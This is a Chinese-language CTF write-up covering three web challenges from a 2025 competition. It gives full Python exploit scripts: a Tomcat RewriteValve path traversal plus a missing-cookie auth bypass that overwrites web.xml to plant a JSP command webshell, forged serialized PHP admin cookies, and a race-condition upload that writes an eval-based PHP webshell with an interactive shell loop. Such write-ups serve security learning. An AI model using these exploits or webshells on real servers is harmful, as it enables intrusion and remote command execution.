---
title: pcb-2025-web
published: 2025-12-15
description: pcb-2025
tags: [pcb]
category: 比赛
draft: false
---

# pcs5-ez_java

打开示例又是一个登录框，admin被占用就用Admin注册

成功登录

根据前面题目的经验，打开cookie发现是jwt编码

![image1](../../../public/pcb5-ez_java/image1-1765879704414-14-1765879840107-2.png)

将Admin改为admin编码

``eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTc2NTYyMjE4M30.uqlZpRIPHzHnA45-ddAwJwLT1Ga6an55bsBk2tMlvckXWETrXM3jM5jrG4kKdI-zFhn6GOVUQCV1IkdDlFwsrQ``

奇怪的来了，后台显示未经授权

![image2](../../../public/pcb5-ez_java/image2-1765879840107-3.png)

好在这里报错爆出了apache服务器和版本Apache Tomcat/9.0.108

根据提示

> RewriteCond %{QUERY_STRING} (^|&)path=([^&]+) RewriteRule ^/download$ /%2 [B,L]

发现这里存在``CVE-2025-55752``，也就是``Apache Tomcat RewriteValve目录遍历漏洞``

https://blog.csdn.net/AKM4180/article/details/154134981

访问web.xml文件：``/download?path=%2fWEB-INF%2fweb.xml``，得到

![image3](../../../public/pcb5-ez_java/image3-1765879725336-19-1765879840107-4.png)

这里有好几个servlet，我们先读取AdminDashboardServlet

http://192.168.18.25:25004/download?path=%2FWEB-INF%2Fclasses%2Fcom%2Fctf%2FBackUpServlet.class

得到一个download，将源码反编译得到

![image4](../../../public/pcb5-ez_java/image4-1765879729406-21-1765879840107-5.png)

其中``validateAdmin``方法存在逻辑漏洞：

```java
    static boolean validateAdmin(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        Cookie[] cookies = req.getCookies();
        if (cookies != null) {
            for(Cookie cookie : cookies) {
                if ("jwt".equals(cookie.getName())) {
                    String value = cookie.getValue();
                    String username = JwtUtil.validateToken(value);
                    if (username == null) {
                        resp.sendError(401);
                        return false;
                    }

                    if (username.compareTo("admin") != 0) {
                        resp.sendError(401);
                        return false;
                    }
                }
            }
        }

        resp.setContentType("application/json;charset=UTF-8");
        return true;
    }
```

这段代码代表当**不携带任何 Cookie** 时，将会执行``return true``操作，也就是不携带cookie即可访问``/admin/``路由下所有接口

浏览器并未开启jsp解析服务，所以我们要上传包含``JspServlet``的恶意``web.xml``配置，覆盖带原有`WEB-INF/web.xml`，使服务器能够解析我们的恶意jsp文件（webshell)

其中`renameFile`方法的`getCanonicalFile`对文件路径进行检测，解析掉所有的"."和".."

```java
File base = (new File(this.getServletContext().getRealPath(resourceDir))).getCanonicalFile();
```

所以我们需要将resourceDir设置为"."，然后通过`/admin/rename`将上传的恶意web.xml改为WEB-INF/web.xml

Tomcat检测到新的web.xml会自动重载应用，上传我们的jsp webshell即可执行命令

```java
import requests
import time
import sys

# ================= 配置区域 =================
URL = "http://192.168.18.25:25004"
CMD_TO_EXECUTE = "cat /flag"  # 获取 flag 的命令
PROXY = None # {"http": "http://127.0.0.1:8080"}  # 如果需要 Burp 调试，取消注释

# ================= Payload 构造 =================

# 1. 恶意的 web.xml (修正版：包含原有业务配置)
# 作用：在保留原有上传/管理功能的基础上，强行开启 JSP 解析
MALICIOUS_WEB_XML = """<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
         http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

  <servlet>
      <servlet-name>jsp</servlet-name>
      <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
      <init-param>
          <param-name>fork</param-name>
          <param-value>false</param-value>
      </init-param>
      <init-param>
          <param-name>xpoweredBy</param-name>
          <param-value>false</param-value>
      </init-param>
      <load-on-startup>3</load-on-startup>
  </servlet>
  <servlet-mapping>
      <servlet-name>jsp</servlet-name>
      <url-pattern>*.jsp</url-pattern>
  </servlet-mapping>

  <servlet>
    <servlet-name>LoginServlet</servlet-name>
    <servlet-class>com.ctf.LoginServlet</servlet-class>
  </servlet>
  <servlet>
    <servlet-name>RegisterServlet</servlet-name>
    <servlet-class>com.ctf.RegisterServlet</servlet-class>
  </servlet>
  
  <servlet>
    <servlet-name>DashboardServlet</servlet-name>
    <servlet-class>com.ctf.DashboardServlet</servlet-class>
    <multipart-config>
      <max-file-size>10485760</max-file-size>
      <max-request-size>20971520</max-request-size>
      <file-size-threshold>0</file-size-threshold>
    </multipart-config>
  </servlet>
  
  <servlet>
    <servlet-name>AdminDashboardServlet</servlet-name>
    <servlet-class>com.ctf.AdminDashboardServlet</servlet-class>
    <multipart-config>
      <max-file-size>10485760</max-file-size>
      <max-request-size>20971520</max-request-size>
      <file-size-threshold>0</file-size-threshold>
    </multipart-config>
  </servlet>
  
  <servlet>
    <servlet-name>BackUpServlet</servlet-name>
    <servlet-class>com.ctf.BackUpServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>LoginServlet</servlet-name>
    <url-pattern>/login</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>RegisterServlet</servlet-name>
    <url-pattern>/register</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>DashboardServlet</servlet-name>
    <url-pattern>/dashboard/*</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>AdminDashboardServlet</servlet-name>
    <url-pattern>/admin/*</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>BackUpServlet</servlet-name>
    <url-pattern>/backup/*</url-pattern>
  </servlet-mapping>

  <welcome-file-list>
    <welcome-file>index.html</welcome-file>
  </welcome-file-list>
</web-app>
"""

# 2. JSP Webshell (增强版：支持标准输出和错误输出)
JSP_SHELL = r"""<%@ page import="java.io.*,java.util.*" %>
<pre>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        // 使用 /bin/sh -c 兼容管道符和复杂命令
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        InputStream in = p.getInputStream();
        Scanner s = new Scanner(in).useDelimiter("\\A");
        String output = s.hasNext() ? s.next() : "";
        
        InputStream err = p.getErrorStream();
        Scanner sErr = new Scanner(err).useDelimiter("\\A");
        String error = sErr.hasNext() ? sErr.next() : "";
        
        out.println(output + error);
    }
%>
</pre>"""

# ================= 工具函数 =================

def set_resource_dir(path):
    """利用 Auth Bypass 设置 resourceDir 为 WebRoot"""
    print(f"[*] Setting ResourceDir to: {path}")
    try:
        # 关键：不带 cookies 触发 Auth Bypass
        r = requests.post(f"{URL}/admin/challengeResourceDir", 
                          data={"new-path": path},
                          proxies=PROXY)
        if r.status_code == 200:
            print("[+] ResourceDir set successfully.")
            return True
        else:
            print(f"[-] Failed to set ResourceDir: {r.status_code} - {r.text}")
            return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def upload_file(filename, content):
    """模拟文件上传，目标接口通常是 /dashboard/upload 或 /admin/upload"""
    print(f"[*] Uploading/Writing file: {filename}")
    try:
        files = {'file': (filename, content)}
        # 尝试使用 dashboard upload，如果失败可以换 /admin/upload
        upload_url = f"{URL}/dashboard/upload" 
        # upload_url = f"{URL}/admin/upload" # 备用接口
        
        r = requests.post(upload_url, files=files, proxies=PROXY)
        
        if r.status_code == 200:
            print(f"[+] File {filename} uploaded.")
            return True
        else:
            # 有时候虽然报 500 或其他错，但文件其实写进去了，检查一下
            print(f"[-] Upload status: {r.status_code}. Checking file existence...")
            check = requests.get(f"{URL}/{filename}", proxies=PROXY)
            if check.status_code == 200:
                print(f"[+] Check passed: {filename} exists on server.")
                return True
            return False
    except Exception as e:
        print(f"[-] Upload Error: {e}")
        return False

def rename_file(old_path, new_path):
    """利用 rename 接口移动/覆盖文件"""
    print(f"[*] Renaming {old_path} -> {new_path}")
    try:
        r = requests.post(f"{URL}/admin/rename", 
                          data={"oldPath": old_path, "newName": new_path},
                          proxies=PROXY)
        # 检查返回内容确认是否成功
        if r.status_code == 200 and ('"renamed":true' in r.text or 'true' in r.text):
            print("[+] Rename successful.")
            return True
        else:
            print(f"[-] Rename failed: {r.text}")
            return False
    except Exception as e:
        print(f"[-] Rename Error: {e}")
        return False

def execute_cmd(shell_name, cmd):
    print(f"[*] Executing command: {cmd}")
    try:
        target = f"{URL}/{shell_name}"
        r = requests.get(target, params={"cmd": cmd}, proxies=PROXY)
        if r.status_code == 200:
            print("\n" + "="*20 + " OUTPUT " + "="*20)
            print(r.text.strip())
            print("="*48 + "\n")
        else:
            print(f"[-] Execution failed: {r.status_code}")
    except Exception as e:
        print(f"[-] Exec Error: {e}")

# ================= 主流程 =================

def main():
    print("[*] Starting Exploitation...")
    
    # 1. 设置 ResourceDir 为 WebRoot (.)
    # 这是所有文件操作的前提，打破目录限制
    if not set_resource_dir("."):
        return

    # 2. 上传包含完整配置的恶意 web.xml
    # 先传为临时文件，防止直接覆盖出错
    temp_xml_name = "pwn_web.xml"
    if not upload_file(temp_xml_name, MALICIOUS_WEB_XML):
        print("[-] Aborting: Failed to upload web.xml content.")
        return

    # 3. 覆盖 WEB-INF/web.xml
    # 这一步会触发 Tomcat 重载
    if not rename_file(temp_xml_name, "WEB-INF/web.xml"):
        print("[-] Aborting: Failed to overwrite web.xml.")
        return

    # 4. 等待 Tomcat 重载配置 (Reload Context)
    print("[*] Waiting 15 seconds for Tomcat to reload configuration...")
    time.sleep(15)

    # 5. 【重要补刀】重载后，ResourceDir 变量可能会重置回默认值
    # 所以为了保险，我们再次将其设置为 "."，确保后续上传的 shell 能被正确 rename
    print("[*] Re-setting ResourceDir to . after reload...")
    set_resource_dir(".")

    # 6. 上传并部署 JSP Shell
    # 先传为 txt 绕过可能存在的后缀检查（虽然 web.xml 已经放行了，但稳健为主）
    temp_shell_name = "shell.txt"
    final_shell_name = "shell.jsp"
    
    if not upload_file(temp_shell_name, JSP_SHELL):
        print("[-] Failed to upload shell content.")
        return
    
    if not rename_file(temp_shell_name, final_shell_name):
        print("[-] Failed to rename shell to .jsp.")
        return

    # 7. 执行命令获取 Flag
    print("[+] Exploit chain completed! Testing RCE...")
    execute_cmd(final_shell_name, CMD_TO_EXECUTE)

if __name__ == "__main__":
    main()
```

# pcb5-ez_php

开局一个登录框，尝试弱口令和注入都无解，弹窗username or password err

alert('username or password err');

遂爆破目录得到/flag.php,/test.txt,/upload.php接口
访问

![image1](../../../public/pcb5-ez_java/image1-1765879840107-6.png)

将乱码还原得到

```txt
 CTF 比赛日记：小明的一天

今天，小明参加了一个线下 CTF（Capture The Flag）比赛。这是他第一次真正参与这类比赛，虽然之前在网上做过一些 CTF 题目，但和真正的比赛还是有很大的区别。

 遇到的挑战与解题过程

1. 密码学挑战（Crypto）

比赛一开始，小明就被一道加密题难住了。

题目特征： 密文看起来像是 Base64 编码，但解码后依然不对劲。

解题思路： 小明回忆起曾学过如何处理 异或加密（XOR），于是决定尝试使用一些常见的异或破解工具。

结果： 最终顺利破解了这一关。

2. Web 安全挑战（Web Security）

接下来是一道 Web 安全题目，是一个简单的登录界面。

题目特征： 登录界面。

攻击尝试： 经过一些基本的 SQL 注入（SQL Injection, SQLi） 尝试后 , 他发现系统对用户名输入没有进行适当的过滤。

结果： 成功执行了 SQL 注入，获取到了管理员的用户名和密码。

3. 二进制逆向挑战（Reverse Engineering, Re）

晚上，小明和队友们讨论了一个二进制逆向题。

题目特征： 题目提供了一个加密的文件，要求找出密钥。

解题过程： 通过 静态分析 和 动态调试 的方法。

结果： 最终找到了密钥并提交了解题结果。

 比赛总结与展望

小明觉得整个过程非常充实和有趣。

自我认知： 他意识到自己在 CTF 领域的不足，特别是在一些 二进制逆向 和 网络安全 方面。

收获： 今天的比赛让他学到了很多新的知识，也激发了他继续挑战更高难度题目的动力。

期待下次能够表现得更好！
```



后面发现无论怎么输入都是弹窗，于是尝试伪造admin。查看`cookie`，base64还原得到一串序列化字符，测试伪造admin得到
`TzoxMjoiU2Vzc2lvblxVc2VyIjoxOntzOjIyOiIAU2Vzc2lvblxVc2VyAHVzZXJuYW1lIjtzOjU6ImFkYWRtaW5taW4iO30=`

将cookie放入进入后台

![image2](../../../public/pcb5-ez_java/image2-1765879840085-1.png)

通过对功能点的不断测试，有个文件读取功能有提示

![image3](../../../public/pcb5-ez_java/image3-1765879840108-7.png)

> errors log
>
> You cannot read .php files
> try to bypass

发现不能读取.php文件，我们尝试绕过

![image4](../../../public/pcb5-ez_java/image4-1765879840108-9.png)

在flag.php后面加个/，读到flag

`flag{8fee436d-176e-4b69-80ce-3b2ed0eee331}`



# pcb5-Uplssse

同样登入容易一个登录框，不一样的是这次可以注册

我们注册一个admin用户发现已存在该用户，于是注册Admin用户注册并登录

![image5](../../../public/pcb5-ez_java/image5-1765879840108-8.png)

提示只有`admin`可以上传文件哦

我们将cookie解码，同样得到一串序列化字符串
`O:4:"User":4:{s:8:"username";s:5:"Admin";s:8:"password";s:6:"123456";s:10:"isLoggedIn";b:1;s:8:"is_admin";i:0;}`

我们将Admin改为admin，is_admin值改为1，base64解码提交

`Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6IjEyMzQ1NiI7czoxMDoiaXNMb2dnZWRJbiI7YjoxO3M6ODoiaXNfYWRtaW4iO2k6MTt9`

![image6](../../../public/pcb5-ez_java/image6-1765879840108-10.png)

成功登录

先随便上传一个文件，发现jpg,jpeg,txt等文件能上传，`php`被禁

得到`/var/www/html/tmp/`

安全提示

 系统会对所有上传文件进行内容安全检测

 检测过程可能需要几秒钟时间

违规文件将被自动删除

根据提示系统会对所有上传文件进行内容安全检测，且违规文件将被自动删除
猜测是考文件上传条件竞争

用Wappalyzer得出是apache服务器版本`2.4.25`，同时禁用`php`，

于是尝试上传`.htaccess`配置文件进行绕过
我们通过upload_test_php_worker，持续不断地上传一个带有恶意载荷的 test.php 文件。
通过trigger_tmp_worker，持续不断地请求服务器上的 `/tmp/test.php` 文件

同时在test.php中写入交互式shell，得到payload

``` python
import requests
import threading
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET_HOST = "192.168.18.26"
TARGET_PORT = 25002
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"
UPLOAD_URL = f"{BASE_URL}/upload.php"

COOKIE = "user_auth=Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjQ6InRlc3QiO3M6MTA6ImlzTG9nZ2VkSW4iO2I6MTtzOjg6ImlzX2FkbWluIjtpOjE7fQ=="

cookies = {"user_auth": COOKIE.split("=", 1)[1]}

# 全局标志：是否已成功写入 shell
shell_written = False
lock = threading.Lock()

# 请求会话（复用连接，提升性能）
session = requests.Session()
session.cookies.update(cookies)
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
})

def safe_post(url, files=None, data=None, timeout=5):
    try:
        return session.post(url, files=files, data=data, timeout=timeout)
    except Exception:
        return None

def safe_get(url, timeout=3):
    try:
        return session.get(url, timeout=timeout)
    except Exception:
        return None

def upload_htaccess():
    files = {
        'file': ('.htaccess', b'Require all granted', 'image/jpeg'),
        'upload': (None, '上传文件')
    }
    resp = safe_post(UPLOAD_URL, files=files, timeout=6)
    if resp and resp.status_code < 400:
        print("[+] .htaccess 上传成功")
    else:
        print("[-] .htaccess 上传失败或被拒绝")

def upload_test_php_worker():
    global shell_written
    # 使用单引号包裹外层，避免转义；内层用双引号
    payload_content = b"<?php fputs(fopen('shell.php', 'w'), '<?php eval($_POST[\"cmd\"]); ?>'); phpinfo(); ?>"
    while not shell_written:
        files = {
            'file': ('test.php', payload_content, 'image/jpeg'),
            'upload': (None, '上传文件')
        }
        safe_post(UPLOAD_URL, files=files, timeout=4)
        time.sleep(0.01)  # 避免压垮本地资源

def trigger_tmp_worker():
    global shell_written
    trigger_url = f"{BASE_URL}/tmp/test.php"
    while not shell_written:
        resp = safe_get(trigger_url, timeout=2)
        if resp and resp.status_code == 200:
            # 判断是否包含 phpinfo 特征 或 至少有 PHP 输出
            if b"PHP Version" in resp.content or b"<title>PHP" in resp.content:
                with lock:
                    if not shell_written:
                        shell_written = True
                        print("\n[!!!] 成功触发 /tmp/test.php！shell.php 应已写入（密码: cmd）")
        time.sleep(0.02)

def exploit_shell():
    shell_url = f"{BASE_URL}/tmp/shell.php"
    test_payload = {"cmd": "echo 'SHELL_READY_12345';"}
    try:
        resp = session.post(shell_url, data=test_payload, timeout=6)
        if resp and "SHELL_READY_12345" in resp.text:
            print("[+] shell.php 可用！密码参数为 'cmd'")
            print("[*] 输入命令执行（输入 'exit' 退出）")
            while True:
                try:
                    cmd = input("\n[#] $ ").strip()
                    if cmd.lower() in ("exit", "quit"):
                        break
                    if not cmd:
                        continue
                    # 执行系统命令
                    exec_payload = {"cmd": f"system('{cmd}');"}
                    r = session.post(shell_url, data=exec_payload, timeout=12)
                    if r:
                        # 清理多余 HTML（可选）
                        output = r.text
                        print(output)
                    else:
                        print("[-] 请求无响应")
                except KeyboardInterrupt:
                    print("\n[!] 中断命令输入")
                    break
        else:
            print("[-] shell.php 未生效（可能写入失败或路径错误）")
            # 尝试直接访问看是否存在
            check = safe_get(shell_url)
            if check and check.status_code == 200:
                print("    [?] shell.php 存在但无法执行命令（可能 disable_functions）")
            else:
                print("    [?] shell.php 不存在")
    except Exception as e:
        print(f"[-] 访问 shell.php 出错: {e}")

def main():
    global shell_written
    print(f"[+] 目标: {BASE_URL}")
    print("[*] 正在上传 .htaccess...")
    upload_htaccess()

    print("[*] 启动高并发条件竞争（上传 + 触发）...")
    total_workers = 50  # 总线程数
    upload_workers = 35
    trigger_workers = 15

    with ThreadPoolExecutor(max_workers=total_workers) as executor:
        futures = []

        # 提交上传任务
        for _ in range(upload_workers):
            futures.append(executor.submit(upload_test_php_worker))

        # 提交触发任务
        for _ in range(trigger_workers):
            futures.append(executor.submit(trigger_tmp_worker))

        # 等待任一成功信号
        while not shell_written:
            time.sleep(0.1)

        # 取消所有任务（非强制，但停止新任务）
        print("[*] 条件竞争成功，等待线程收尾...")

    # 利用 shell
    exploit_shell()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] 用户强制退出")
        sys.exit(1)
    except Exception as e:
        print(f"[!] 脚本异常: {e}")
        sys.exit(1)
```

![image7](../../../public/pcb5-ez_java/image7-1765879840108-11.png)

flag在`/flag6f67186d`

最终`flag{121b0e889c7949799ff2dec7dedad081}`